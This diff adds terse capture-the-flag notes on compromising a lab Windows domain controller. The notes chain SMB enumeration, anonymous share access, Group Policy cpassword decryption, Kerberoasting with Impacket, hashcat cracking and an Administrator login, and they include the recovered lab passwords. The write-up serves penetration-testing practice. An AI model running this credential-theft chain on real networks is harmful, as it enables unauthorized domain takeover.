@@ -1,0 +1,73 @@
+nmap -p- -T4 -A 10.10.10.100
+
+enum4linux 10.10.10.100
+
+nullinux 10.10.10.100
+
+the server allows access with blank username and password to smb
+
+smbclient -L 10.10.0.100
+
+//we got shares, try to login in into replication
+
+smbclient //10.10.10.100/Replication
+
+//Anonymmous login succesfull
+
+smb: \> cd active.htb
+smb: \active.htb\> list
+0:      server=10.10.10.100, share=Replication
+
+
+//policies
+smb: \active.htb\Policies\> ls
+  .                                   D        0  Sat Jul 21 16:07:44 2018
+  ..                                  D        0  Sat Jul 21 16:07:44 2018
+  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 16:07:44 2018
+  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 16:07:44 2018
+
+                10459647 blocks of size 4096. 4911902 blocks available
+found the policies
+
+
+//Groups.xml
+policyno\MACHINE\Preferences\Groups
+
+//now
+
+more Groups.XML
+
+//<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+
+//cPassword - A cpassword (no that's not a typo) is a component of Active Directory's Group Policy Preferences that allows administrators to set passwords via Group Policy. That was until they issued a patch in 2014 (MS14-025) that blocked the usage of cpasswords in new policies
+
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+//Password - GPPstillStandingStrong2k18
+
+//user - SVC_TGS
+
+active.htb = domain
+SVC_TGS is the user
+
+//connect via smb
+
+smbclient //10.10.10.100/Users -U=SVC_TGS
+//prompt of password GPP
+
+//use Impacket GETUserSPNs.py
+
+python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+
+//copy it as hash and decrypt in hashcat
+
+hashcat -m 13100 -a 0 kerberos.txt rockyou.txt
+
+//Ticketmaster1968 password for admin
+
+//connect as admin
+
+smbclient //10.10.10.100/Users -U=Administrator
+ 
+
+
